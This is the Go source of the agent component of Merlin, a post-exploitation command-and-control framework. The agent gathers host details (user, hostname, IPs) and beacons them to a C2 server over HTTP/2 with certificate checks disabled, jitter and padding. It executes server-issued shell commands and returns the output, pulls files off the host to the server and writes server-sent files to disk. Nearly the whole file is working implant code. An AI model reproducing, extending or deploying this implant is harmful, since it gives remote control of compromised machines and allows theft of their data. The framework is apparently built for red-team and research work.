// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2018  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"
	"crypto/sha1"
	"io"
	"path/filepath"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"golang.org/x/net/http2"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
)

// GLOBAL VARIABLES
var mRun = true
var h2Client = getH2WebClient()
var agentShell = ""
var build = "nonRelease"
var initial = false

//TODO this is a duplicate with agents/agents.go, centralize

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID            uuid.UUID
	Platform      string
	Architecture  string
	UserName      string
	UserGUID      string
	HostName      string
	Ips           []string
	Pid           int
	iCheckIn      time.Time
	sCheckIn      time.Time
	Version       string
	Build         string
	WaitTime      time.Duration
	PaddingMax    int
	MaxRetry      int
	FailedCheckin int
	Skew		  int64
	Verbose		  bool
	Debug 		  bool
}

// New creates a new agent struct with specific values and returns the object
func New(verbose bool, debug bool) Agent {
	if debug{message("debug", "Entering agent.init() function")}
	a := Agent {
		ID: uuid.NewV4(),
		Platform: runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid: os.Getpid(),
		Version: merlin.Version,
		WaitTime: 30000 * time.Millisecond,
		PaddingMax: 4096,
		MaxRetry: 7,
		Skew: 3000,
		Verbose: verbose,
		Debug: debug,
	}

	u, errU := user.Current()
	if errU != nil {
		if a.Debug {
			message("warn","There was an error getting the username")
			message("warn",fmt.Sprintf("%s", errU.Error()))
		}
	} else{
		a.UserName = u.Username
		a.UserGUID = u.Gid
	}

	h, errH := os.Hostname()
	if errH != nil {
		if a.Debug {
			message("warn","There was an error getting the hostname")
			message("warn", fmt.Sprintf("%s", errH.Error()))
		}
	} else {
		a.HostName = h
	}
	
	interfaces, errI := net.Interfaces()
	if errI != nil {
		if a.Debug {
			message("warn", "There was an error getting the the IP addresses")
			message("warn", fmt.Sprintf("%s", errI.Error()))
		}
	} else {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					a.Ips = append(a.Ips, addr.String())
				}
			}
		}
	}

	if a.Verbose {
		message("info","Host Information:")
		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
		message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
		message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
		message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) //TODO A username like _svctestaccont causes error
		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
	}
	if debug{message("debug", "Leaving agent.init() function")}
	return a
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run(server string, proto string) {
	rand.Seed(time.Now().UTC().UnixNano())

	if a.Verbose {
		message("note",fmt.Sprintf("Agent version: %s", merlin.Version))
		message("note", fmt.Sprintf("Agent build: %s", build))
	}

	for mRun {
		if initial {
			if a.Verbose {
				message("note","Checking in")
			}
			a.statusCheckIn(server, h2Client)
		} else {
			initial = a.initialCheckIn(server, h2Client)
			if initial {
				a.agentInfo(server, h2Client)
			}
		}
		if a.FailedCheckin >= a.MaxRetry {
			if a.Debug{message("debug", "Failed Checkin is greater than or equal to max retries. Quitting")}
			os.Exit(1)
		}

		timeSkew := time.Duration(rand.Int63n(a.Skew)) * time.Millisecond
		totalWaitTime := a.WaitTime + timeSkew

		if a.Verbose {
			message("note",fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now()))
		}
		time.Sleep(totalWaitTime)
	}
}

func (a *Agent) initialCheckIn(host string, client *http.Client) bool {

	if a.Debug {message("debug","Entering initialCheckIn fuction")}

	// JSON "initial" payload object
	i := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Pid:          a.Pid,
		Ips:          a.Ips,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if a.Debug {
			message("warn","There was an error marshaling the JSON object")
			message("warn", fmt.Sprintf("%s", errP.Error()))
		}
	}

	// JSON message to be sent to the server
	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "InitialCheckIn", // TODO Can set this to a constant in messages.go
		Payload: (*json.RawMessage)(&payload),
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if a.Verbose {
		message("note",fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		a.FailedCheckin++
		if a.Debug {
			message("warn","There was an error with the HTTP client while performing a POST:")
			message("warn",fmt.Sprintf("%s", err.Error()))
		}
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {message("debug","Leaving initialCheckIn function, returning False")}
		return false
	}
	if a.Debug {
		message("debug","HTTP Response:")
		message("debug",fmt.Sprintf("%s", resp))
	}
	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note",fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn","There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		if a.Debug {message("debug","Leaving initialCheckIn function, returning False.")}
		return false
	}
	a.FailedCheckin = 0
	if a.Debug {message("debug","Leaving initialCheckIn function, returning True")}
	return true
}

func (a *Agent) statusCheckIn(host string, client *http.Client) {
	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "StatusCheckIn",
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)

	if a.Verbose {
		message("note",fmt.Sprintf("Connecting to web server at %s for status check in.", host))
	}

	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		if a.Debug {
			message("warn", "There was an error with the HTTP Response:")
			message("warn", fmt.Sprintf("%s",err.Error())) // On Mac I get "read: connection reset by peer" here but not on other platforms
		} // Only does this with a 10s Sleep
		a.FailedCheckin++
		if a.Verbose {
			message("note",fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return
	}

	if a.Debug {
		message("debug","HTTP Response:")
		message("debug", fmt.Sprintf("ContentLength: %d", resp.ContentLength))
		message("debug", fmt.Sprintf("%s", resp))
	}

	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note",fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn","There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		return
	}

	a.FailedCheckin = 0

	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(resp.Body).Decode(&j)

		if a.Debug {
			message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
			message("debug", fmt.Sprintf("Message Type: %s", j.Type))
			message("debug",fmt.Sprintf("Message Payload: %s", j.Payload))
		} else if a.Verbose {
			message("success", fmt.Sprintf("%s Message Type Received!", j.Type))
		}
		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
		case "FileTransfer":
			var p messages.FileTransfer
			json.Unmarshal(payload, &p)

			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
			}

			// Agent will be downloading a file from the server
			if p.IsDownload {
				if a.Verbose {message("note","FileTransfer type: Download")}
				// Setup the message to submit the status of the upload
				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: "",
					Stderr: "",
				}

				d, _ := filepath.Split(p.FileLocation)
				_, directoryPathErr := os.Stat(d)
				if directoryPathErr != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error getting the FileInfo structure for the directory %s", d))
						message("warn", fmt.Sprintf("%s", directoryPathErr.Error()))
					}
					c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the " +
						"remote directory %s:\r\n", p.FileLocation)
					c.Stderr += fmt.Sprintf(directoryPathErr.Error())
				}
				if c.Stderr == "" {
					if a.Verbose {
						message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
					}
					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
					if downloadFileErr != nil {
						c.Stderr = downloadFileErr.Error()
						if a.Verbose {
							message("warn", "There was an error decoding the fileBlob")
							message("warn", fmt.Sprintf("%s", downloadFileErr.Error()))
						}
					} else {
						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
						if errF != nil {
							c.Stderr = errF.Error()
							if a.Verbose {
								message("warn", fmt.Sprintf("There was an error writing to : %s", p.FileLocation))
								message("warn", fmt.Sprintf("%s", errF.Error()))
							}
						} else {
							if a.Verbose {
								message("success",fmt.Sprintf("Successfully download file to %s", p.FileLocation))
							}
							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
						}
					}
				}

				k, _ := json.Marshal(c)
				g.Type = "CmdResults"
				g.Payload = (*json.RawMessage)(&k)
			}

			// Agent will uploading a file to the server
			if !p.IsDownload {
				if a.Verbose {message("note", "FileTransfer type: Upload")}

				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
				if fileDataErr != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
						message("warn", fmt.Sprintf("%s", fileDataErr.Error()))
					}
					errMessage := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
					errMessage += fileDataErr.Error()
					c := messages.CmdResults{
						Job:    p.Job,
						Stderr: errMessage,
					}
					if a.Verbose {
						message("note", "Sending error message to sever.")
					}
					k, _ := json.Marshal(c)
					g.Type = "CmdResults"
					g.Payload = (*json.RawMessage)(&k)

				} else {
					fileHash := sha1.New()
					io.WriteString(fileHash, string(fileData))

					if a.Verbose {
						message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
							p.FileLocation,
							len(fileData),
							fileHash.Sum(nil)))
					}
					c := messages.FileTransfer{
						FileLocation: p.FileLocation,
						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
						IsDownload:   true,
						Job:          p.Job,
					}

					k, _ := json.Marshal(c)
					g.Type = "FileTransfer"
					g.Payload = (*json.RawMessage)(&k)

				}
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
			if respErr != nil {
				if a.Verbose {
					message("warn", "There was an error sending the FileTransfer message to the server")
					message("warn", fmt.Sprintf("%s", respErr.Error()))
				}
			}
			if resp2.StatusCode != 200 {
				if a.Verbose {
					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
				}
			}

		case "CmdPayload":
			var p messages.CmdPayload
			json.Unmarshal(payload, &p)
			stdout, stderr := a.executeCommand(p) // TODO this needs to be its own routine so the agent can continue to function while it is going

			c := messages.CmdResults{
				Job:    p.Job,
				Stdout: stdout,
				Stderr: stderr,
			}

			k, _ := json.Marshal(c)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdResults",
				Payload: (*json.RawMessage)(&k),
				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			if a.Verbose {
				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
			}
			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
			if resp2.StatusCode != 200 {
				if a.Verbose {
					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
				}
			}
		case "ServerOk":
			if a.Verbose {
				message("note", "Received Server OK, doing nothing")
			}
		case "AgentControl":
			if a.Verbose {
				message("note", "Received Agent Control Message")
			}
			var p messages.AgentControl
			json.Unmarshal(payload, &p)

			switch p.Command {
			case "kill":
				if a.Verbose {
					message("note", "Received Agent Kill Message")
				}
				os.Exit(0)
			case "sleep":
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent sleep time to %s milliseconds", p.Args))
				}
				t, err := time.ParseDuration(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent waitTime")
						message("warn", fmt.Sprintf("%s",err.Error()))
					}
				}
				if t > 0 {
					a.WaitTime = t
					a.agentInfo(host, client)
				} else {
					if a.Verbose {
						message("warn", "The agent was provided with a time that was not greater than zero.")
						message("warn", fmt.Sprintf("The provided time was: %s", t.String()))
					}
				}
			case "skew":
				t, err := strconv.ParseInt(p.Args, 10, 64)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent skew interval")
						message("warn", fmt.Sprintf("%s", err.Error()))
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
				}
				a.Skew = t
				a.agentInfo(host, client)
			case "padding":
				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent message padding size")
						message("warn", fmt.Sprintf("%s", err.Error()))
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
				}
				a.PaddingMax = t
				a.agentInfo(host, client)
			case "initialize":
				if a.Verbose {
					message("note", "Received agent re-initialize message")
				}
				initial = false
			case "maxretry":

				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent max retries")
						message("warn", fmt.Sprintf("%s", err.Error()))
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent max retries to %d", t))
				}
				a.MaxRetry = t
				a.agentInfo(host, client)
			default:
				if a.Verbose {
					message("warn", fmt.Sprintf("Unknown AgentControl message type received %s", p.Command))
				}
			}
		default:
			if a.Verbose {
				message("warn", fmt.Sprintf("Received unrecognized message type: %s", j.Type))
			}
		}
	}
}

func getH2WebClient() *http.Client {

	// Setup TLS Configuration
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			InsecureSkipVerify:       true,
			PreferServerCipherSuites: false,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			},
			NextProtos: []string{"h2"},
		},
		DisableCompression: false,
	}

	// Setup HTTP Client Configuration
	client := &http.Client{
		Transport: tr,
	}
	return client
}

func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

	} else if a.Verbose {
		message("success", fmt.Sprintf("Executing command %s %s %s", agentShell, j.Command, j.Args))
	}

	stdout, stderr = ExecuteCommand(j.Command, j.Args)

	if a.Verbose {
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", fmt.Sprintf("%s", stdout))
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
}

func (a *Agent) agentInfo(host string, client *http.Client) {
	i := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      a.WaitTime.String(),
		PaddingMax:    a.PaddingMax,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Skew:		   a.Skew,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if a.Debug {
			message("warn", "There was an error marshaling the JSON object")
			message("warn", fmt.Sprintf("%s", errP.Error()))
		}
	}

	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "AgentInfo",
		Payload: (*json.RawMessage)(&payload),
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if a.Verbose {
		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		a.FailedCheckin++
		if a.Debug {
			message("warn", "There was an error with the HTTP client while performing a POST:")
			message("warn", fmt.Sprintf(err.Error()))
		}
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return
	}
	if a.Debug {
		message("debug", "HTTP Response:")
		message("warn", fmt.Sprintf("%s", resp))
	}
	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn", "There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		return
	}
	a.FailedCheckin = 0
}

// TODO Make a generic function to send a JSON message; Keep basic so protocols can be switched (i.e. DNS)

// TODO centralize this into a package because it is used here and in the server
// message is used to print a message to the command line
func message (level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

/*

1. POST System Enumeration Information and receive back JSON object w/ additional instructions
2. Sleep
3. Check in w/ Server
4. Execute commands if provided by server
5. Return results to server
6. Sleep and Check In
*/

// TODO add cert stapling
// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
// TODO send cmdResult for agentcontrol messages